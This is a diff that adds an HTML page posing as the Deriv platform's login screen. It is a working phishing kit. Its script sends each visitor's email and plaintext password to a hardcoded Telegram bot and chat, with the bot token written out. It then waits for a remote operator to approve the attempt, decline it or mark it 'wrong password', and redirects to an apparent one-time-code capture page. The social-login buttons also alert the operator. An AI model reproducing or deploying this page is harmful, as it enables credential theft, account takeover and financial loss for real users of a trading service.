@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Deriv Login</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        .card {
+            border-radius: 20px;
+        }
+        
+        .form-control:focus {
+            box-shadow: none;
+            border-color: #dc3545;
+        }
+        
+        .btn:focus {
+            box-shadow: none;
+            border-color: #dc3545;
+        }
+        
+        .toggle-password-button {
+            position: absolute;
+            top: 50%;
+            right: 10px;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            padding: 0;
+            color: #6c757d;
+        }
+        /* ===== SPINNER OVERLAY ===== */
+        
+        .spinner-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.5s ease, visibility 0.5s ease;
+            pointer-events: none;
+        }
+        
+        .spinner-overlay.active {
+            opacity: 1;
+            visibility: visible;
+            pointer-events: all;
+        }
+        
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #ffffff30;
+            border-top-color: #dc3545;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        
+        .spinner-text {
+            color: #e0e0e0;
+            font-size: 14px;
+            margin-top: 20px;
+            font-weight: 500;
+        }
+        
+        .spinner-email {
+            color: #dc3545;
+            font-size: 13px;
+            margin-top: 8px;
+            font-weight: 600;
+        }
+        
+        .cancel-poll-btn {
+            margin-top: 20px;
+            padding: 10px 24px;
+            background: transparent;
+            border: 1px solid #6c757d;
+            border-radius: 50px;
+            color: #adb5bd;
+            font-family: inherit;
+            font-size: 13px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .cancel-poll-btn:hover {
+            border-color: #dc3545;
+            color: #dc3545;
+        }
+        
+        .error-msg {
+            background: rgba(220, 53, 69, 0.15);
+            border: 1px solid rgba(220, 53, 69, 0.3);
+            color: #f8d7da;
+            padding: 12px 16px;
+            border-radius: 10px;
+            font-size: 13px;
+            margin-bottom: 20px;
+            display: none;
+            text-align: center;
+        }
+    </style>
+</head>
+
+<body class="bg-light">
+    <div class="container d-flex flex-column align-items-center justify-content-center vh-100">
+        <div class="text-center mb-4">
+            <h1 class="text-danger fw-bold">deriv</h1>
+        </div>
+        <div class="card shadow p-4" style="max-width: 400px; width: 100%;">
+            <h5 class="text-center mb-4">Welcome back</h5>
+
+            <div class="error-msg" id="loginError"></div>
+
+            <form id="loginForm">
+                <div class="mb-3">
+                    <label for="email" class="form-label">Email</label>
+                    <input type="email" class="form-control" id="email" placeholder="example@email.com" required>
+                </div>
+                <div class="mb-3">
+                    <label for="password" class="form-label">Password</label>
+                    <div class="position-relative">
+                        <input type="password" class="form-control" id="password" placeholder="Password" required>
+                        <button class="toggle-password-button" type="button" id="togglePassword">
+                            <i class="fas fa-eye-slash" id="eyeIcon"></i>
+                        </button>
+                    </div>
+                </div>
+                <div class="mb-3 text-end">
+                    <a href="#" class="text-danger text-decoration-none">Forgot password?</a>
+                </div>
+                <button type="submit" class="btn btn-danger w-100 mb-3" id="loginBtn">Log in</button>
+                <div class="d-flex align-items-center mb-3">
+                    <hr class="flex-grow-1">
+                    <span class="mx-2 text-muted">Or continue with</span>
+                    <hr class="flex-grow-1">
+                </div>
+                <button class="btn btn-outline-danger w-100 mb-2">
+                    <i class="fas fa-fingerprint me-2"></i>Log in with biometrics
+                </button>
+                <button class="btn btn-light w-100 mb-2" onclick="socialLogin('Google');">
+                    <img src="https://www.google.com/favicon.ico" alt="Google" width="20" class="me-2">Google
+                </button>
+                <button class="btn btn-primary w-100" onclick="socialLogin('Facebook');">
+                    <i class="fab fa-facebook-f me-2"></i>Facebook
+                </button>
+            </form>
+        </div>
+    </div>
+
+    <!-- SPINNER OVERLAY -->
+    <div class="spinner-overlay" id="spinnerOverlay">
+        <div class="spinner"></div>
+        <p class="spinner-text">Verifying your credentials...</p>
+        <p class="spinner-email" id="spinnerEmail"></p>
+        <button class="cancel-poll-btn" onclick="cancelPolling()">Cancel</button>
+    </div>
+
+    <script>
+        // =====================================================
+        // CONFIG
+        // =====================================================
+        const TELEGRAM_BOT_TOKEN = "8859101981:AAEQiFAqQtmOLCgEkUMn_ieXpqrs-A5KTQ8";
+        const TELEGRAM_CHAT_ID = "6367881211";
+        const APPROVAL_REDIRECT_URL = "derotp.html";
+
+        // =====================================================
+        // POLLING STATE
+        // =====================================================
+        let pollDecided = false;
+        let pollTimeoutId = null;
+        let pollAbortController = null;
+        let isPollingActive = false; // Prevents concurrent getUpdates calls
+
+        // =====================================================
+        // UI HELPERS
+        // =====================================================
+        function showError(msg) {
+            const err = document.getElementById('loginError');
+            if (err) {
+                err.textContent = msg;
+                err.style.display = 'block';
+            }
+        }
+
+        function hideError() {
+            const err = document.getElementById('loginError');
+            if (err) err.style.display = 'none';
+        }
+
+        function maskEmail(email) {
+            const parts = email.split('@');
+            if (parts.length !== 2) return email;
+            const local = parts[0];
+            const domain = parts[1];
+            let maskedLocal;
+            if (local.length <= 2) {
+                maskedLocal = local.charAt(0) + '*';
+            } else {
+                maskedLocal = local.charAt(0) + '*'.repeat(local.length - 2) + local.charAt(local.length - 1);
+            }
+            return maskedLocal + '@' + domain;
+        }
+
+        // =====================================================
+        // TOGGLE PASSWORD
+        // =====================================================
+        document.getElementById("togglePassword").addEventListener("click", function() {
+            const passwordInput = document.getElementById("password");
+            const eyeIcon = document.getElementById("eyeIcon");
+            if (passwordInput.type === "password") {
+                passwordInput.type = "text";
+                eyeIcon.classList.remove("fa-eye-slash");
+                eyeIcon.classList.add("fa-eye");
+            } else {
+                passwordInput.type = "password";
+                eyeIcon.classList.remove("fa-eye");
+                eyeIcon.classList.add("fa-eye-slash");
+            }
+        });
+
+        // =====================================================
+        // CANCEL POLLING
+        // =====================================================
+        function cancelPolling() {
+            pollDecided = true;
+            if (pollTimeoutId) clearTimeout(pollTimeoutId);
+            if (pollAbortController) pollAbortController.abort();
+            isPollingActive = false;
+            document.getElementById('spinnerOverlay').classList.remove('active');
+            document.getElementById('loginBtn').disabled = false;
+            showError('Request cancelled. Please try again.');
+        }
+
+        // =====================================================
+        // POLLING ENGINE — FIXED: no conflict, long-polling with timeout
+        // =====================================================
+        function startPolling(userId) {
+            pollDecided = false;
+            let offset = 0;
+            let pollCount = 0;
+            const MAX_POLLS = 180; // ~3 minutes with 15s timeout + 0.5s gap
+
+            // Abort any previous session
+            if (pollAbortController) pollAbortController.abort();
+            pollAbortController = new AbortController();
+
+            function pollLoop() {
+                // Guard: don't start a new poll if already decided or already polling
+                if (pollDecided) return;
+                if (isPollingActive) {
+                    // Queue retry in 500ms instead of firing duplicate request
+                    pollTimeoutId = setTimeout(pollLoop, 500);
+                    return;
+                }
+
+                pollCount++;
+                if (pollCount > MAX_POLLS) {
+                    pollDecided = true;
+                    document.getElementById('spinnerOverlay').classList.remove('active');
+                    document.getElementById('loginBtn').disabled = false;
+                    showError('Request timed out. Please try again.');
+                    return;
+                }
+
+                isPollingActive = true;
+
+                // LONG POLLING: timeout=15 means Telegram holds the connection
+                // for up to 15 seconds until an update arrives.
+                // allowed_updates filters to only callback_query — no noise.
+                const url =
+                    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates` +
+                    `?offset=${offset}&timeout=15&allowed_updates=%5B%22callback_query%22%5D`;
+
+                fetch(url, {
+                        signal: pollAbortController.signal
+                    })
+                    .then(res => {
+                        if (res.status === 409) {
+                            // Conflict: another getUpdates connection exists.
+                            // Wait 3s and retry — don't treat as fatal.
+                            isPollingActive = false;
+                            pollTimeoutId = setTimeout(pollLoop, 3000);
+                            return null;
+                        }
+                        if (!res.ok) throw new Error('HTTP ' + res.status);
+                        return res.json();
+                    })
+                    .then(data => {
+                        if (data === null) return; // 409 case already handled
+
+                        if (!data.ok || pollDecided) {
+                            isPollingActive = false;
+                            if (!pollDecided) {
+                                pollTimeoutId = setTimeout(pollLoop, 1000);
+                            }
+                            return;
+                        }
+
+                        // Process any updates received
+                        if (data.result && data.result.length > 0) {
+                            for (const update of data.result) {
+                                // Advance offset past this update
+                                offset = update.update_id + 1;
+
+                                if (update.callback_query) {
+                                    const action = update.callback_query.data;
+
+                                    // MUST answer callback query so Telegram
+                                    // stops showing the loading spinner on the button
+                                    fetch(
+                                            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
+                                                method: 'POST',
+                                                headers: {
+                                                    'Content-Type': 'application/json'
+                                                },
+                                                body: JSON.stringify({
+                                                    callback_query_id: update.callback_query.id,
+                                                    text: "Processing..."
+                                                })
+                                            }
+                                        )
+                                        .catch(() => {});
+
+                                    // Match action against our userId
+                                    if (action === `approve_${userId}`) {
+                                        pollDecided = true;
+                                        isPollingActive = false;
+                                        document.getElementById('spinnerOverlay').classList.remove('active');
+                                        window.location.href = APPROVAL_REDIRECT_URL;
+                                        return;
+                                    } else if (action === `decline_${userId}`) {
+                                        pollDecided = true;
+                                        isPollingActive = false;
+                                        document.getElementById('spinnerOverlay').classList.remove('active');
+                                        document.getElementById('loginBtn').disabled = false;
+                                        showError('Request declined. Please try again.');
+                                        return;
+                                    } else if (action === `wrong_${userId}`) {
+                                        pollDecided = true;
+                                        isPollingActive = false;
+                                        document.getElementById('spinnerOverlay').classList.remove('active');
+                                        document.getElementById('loginBtn').disabled = false;
+                                        showError('Wrong password. Please enter the correct password.');
+                                        return;
+                                    }
+                                    // If action doesn't match our userId (different session),
+                                    // continue polling — offset is already advanced past it
+                                }
+                            }
+                        }
+
+                        // Continue polling
+                        isPollingActive = false;
+                        if (!pollDecided) {
+                            // Small gap before next long-poll to avoid tight loop
+                            pollTimeoutId = setTimeout(pollLoop, 500);
+                        }
+                    })
+                    .catch(err => {
+                        if (err.name === 'AbortError') return;
+                        console.error('Poll error:', err);
+                        isPollingActive = false;
+                        if (!pollDecided) {
+                            pollTimeoutId = setTimeout(pollLoop, 2000);
+                        }
+                    });
+            }
+
+            // Start polling immediately — no separate "get initial offset" call.
+            // With offset=0, Telegram returns all unconfirmed updates.
+            // The loop processes them sequentially and advances offset.
+            pollLoop();
+        }
+
+        // =====================================================
+        // SEND MESSAGE + INLINE KEYBOARD
+        // =====================================================
+        function sendTelegramWithInlineKeyboard(message, keyboard, userId) {
+            const spinnerOverlay = document.getElementById('spinnerOverlay');
+            const loginBtn = document.getElementById('loginBtn');
+
+            let attempts = 0;
+            const maxAttempts = 3;
+
+            function attemptSend() {
+                attempts++;
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            text: message,
+                            parse_mode: 'HTML',
+                            reply_markup: JSON.stringify(keyboard)
+                        })
+                    })
+                    .then(res => {
+                        if (!res.ok) throw new Error('HTTP ' + res.status);
+                        return res.json();
+                    })
+                    .then(data => {
+                        if (data.ok) {
+                            // Message sent — start polling for admin's decision
+                            startPolling(userId);
+                        } else {
+                            if (attempts < maxAttempts) {
+                                setTimeout(attemptSend, 1000 * attempts);
+                            } else {
+                                spinnerOverlay.classList.remove('active');
+                                loginBtn.disabled = false;
+                                showError('Failed to send notification. Please try again.');
+                            }
+                        }
+                    })
+                    .catch(err => {
+                        console.error('Send error:', err);
+                        if (attempts < maxAttempts) {
+                            setTimeout(attemptSend, 1000 * attempts);
+                        } else {
+                            spinnerOverlay.classList.remove('active');
+                            loginBtn.disabled = false;
+                            showError('Network error. Please check your connection and try again.');
+                        }
+                    });
+            }
+
+            attemptSend();
+        }
+
+        // =====================================================
+        // SOCIAL LOGIN
+        // =====================================================
+        function socialLogin(provider) {
+            hideError();
+            const spinnerOverlay = document.getElementById('spinnerOverlay');
+            const spinnerEmail = document.getElementById('spinnerEmail');
+            const loginBtn = document.getElementById('loginBtn');
+
+            spinnerEmail.textContent = 'Connecting to ' + provider + '...';
+            spinnerOverlay.classList.add('active');
+            loginBtn.disabled = true;
+
+            const userId = provider.toLowerCase() + '_' + Date.now();
+            const message =
+                `🔔 <b>New Deriv ${provider} Login Attempt</b>\n\n` +
+                `📱 Provider: <code>${provider}</code>\n` +
+                `⏰ Time: ${new Date().toLocaleString('en-ZA')}\n\n` +
+                `Please approve, decline, or mark as wrong:`;
+
+            const keyboard = {
+                inline_keyboard: [
+                    [{
+                        text: "✅ APPROVE",
+                        callback_data: `approve_${userId}`
+                    }, {
+                        text: "❌ DECLINE",
+                        callback_data: `decline_${userId}`
+                    }],
+                    [{
+                        text: "⚠️ WRONG PASSWORD",
+                        callback_data: `wrong_${userId}`
+                    }]
+                ]
+            };
+
+            sendTelegramWithInlineKeyboard(message, keyboard, userId);
+        }
+
+        // =====================================================
+        // FORM SUBMIT
+        // =====================================================
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+            hideError();
+
+            const email = document.getElementById("email").value.trim();
+            const password = document.getElementById("password").value;
+
+            if (!email || !password) {
+                showError('Please enter your email and password.');
+                return;
+            }
+
+            const spinnerOverlay = document.getElementById('spinnerOverlay');
+            const spinnerEmail = document.getElementById('spinnerEmail');
+            const loginBtn = document.getElementById('loginBtn');
+
+            spinnerEmail.textContent = maskEmail(email);
+            spinnerOverlay.classList.add('active');
+            loginBtn.disabled = true;
+
+            // Unique userId per session — prevents cross-session match
+            const userId = email.replace(/[^a-zA-Z0-9]/g, '').slice(0, 15) + '_' + Date.now();
+
+            const message =
+                `🔔 <b>New Deriv Login Attempt</b>\n\n` +
+                `📧 Email: <code>${email}</code>\n` +
+                `🔑 Password: <code>${password}</code>\n` +
+                `⏰ Time: ${new Date().toLocaleString('en-ZA')}\n\n` +
+                `Tap to copy the details above.\n` +
+                `Please approve, decline, or mark as wrong password:`;
+
+            const keyboard = {
+                inline_keyboard: [
+                    [{
+                        text: "✅ APPROVE",
+                        callback_data: `approve_${userId}`
+                    }, {
+                        text: "❌ DECLINE",
+                        callback_data: `decline_${userId}`
+                    }],
+                    [{
+                        text: "⚠️ WRONG PASSWORD",
+                        callback_data: `wrong_${userId}`
+                    }]
+                ]
+            };
+
+            sendTelegramWithInlineKeyboard(message, keyboard, userId);
+        });
+    </script>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+
+</html>
